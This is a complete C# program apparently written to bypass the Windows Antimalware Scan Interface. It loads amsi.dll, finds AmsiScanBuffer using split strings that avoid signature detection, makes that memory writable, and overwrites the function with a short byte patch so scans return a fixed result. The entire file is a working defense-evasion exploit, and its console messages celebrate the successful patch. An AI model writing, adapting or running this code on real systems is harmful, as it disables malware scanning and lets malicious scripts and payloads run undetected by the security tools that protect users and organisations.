using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TestAPatch
{
    internal class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        static void Main(string[] args)
        {
            patch();
        }

        private static void patch()
        {
            IntPtr TargetDLL = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve pointer!");
                return;
            }

            IntPtr BufrPtr = GetProcAddress(TargetDLL, "Ams" + "iSc" + "anBu" + "ffer");
            if (BufrPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve function pointer!");
                return;
            }

            Console.WriteLine("Addr: " + BufrPtr.ToString());

            UIntPtr dwSize = (UIntPtr)3;
            uint Zero = 0;

            if (!VirtualProtect(BufrPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not modify memory permissions!");
                return;
            }
            Console.WriteLine("Success: We modified memory permissions!");

            byte[] p = new byte[12] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(12);

            Marshal.Copy(p, 0, unmanagedPointer, 12);

            MoveMemory(BufrPtr, unmanagedPointer, 12);

            //if (!VirtualProtect(BufrPtr, dwSize, 0x20, out Zero))
            //{
            //    Console.WriteLine("ERROR: Could not modify memory permissions!");
            //    return;
            //}
            Console.WriteLine("Success, function patched! :)");
            return;
        }
    }
}
